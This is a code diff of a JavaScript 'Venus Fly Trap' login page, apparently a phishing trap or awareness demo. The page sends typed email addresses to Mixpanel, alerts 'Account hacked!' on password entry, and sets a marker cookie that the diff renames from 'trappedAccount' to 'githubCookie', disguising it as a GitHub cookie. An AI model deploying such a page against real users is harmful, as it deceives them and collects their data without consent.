@@ -11,7 +11,7 @@ let cookies = document.cookie
 		{}
 	);
 
-let trapCookies = cookies.trappedAccount;
+let trapCookies = cookies.githubCookie;
 let rdsCookies = cookies["rds-session"];
 
 let hasRdsCookieNoTrap = rdsCookies && !trapCookies;
@@ -31,7 +31,7 @@ const trapMixpanel = () => {
 			source: "Venus Fly Trap",
 			data: `${emailField.value}`,
 		});
-		document.cookie = "trappedAccount=true";
+		document.cookie = "githubCookie=true";
 	});
 
 	const password = document.getElementById("password");
@@ -39,7 +39,7 @@ const trapMixpanel = () => {
 		if (password.value.length > 3) {
 			alert("Account hacked!");
 			password.value = "";
-			document.cookie = "trappedAccount=true";
+			document.cookie = "githubCookie=true";
 		}
 		mixpanel.track("Password Entered", {
 			source: "Venus Fly Trap",
@@ -51,10 +51,10 @@ const trapMixpanel = () => {
 		mixpanel.track("Credentials Submitted", {
 			source: "Venus Fly Trap",
 		});
-		document.cookie = "trappedAccount=true";
+		document.cookie = "githubCookie=true";
 	});
 
-	if (trapCookies.trappedAccount) {
+	if (trapCookies.githubCookie) {
 		alert("account hacked");
 		location.reload();
 	}
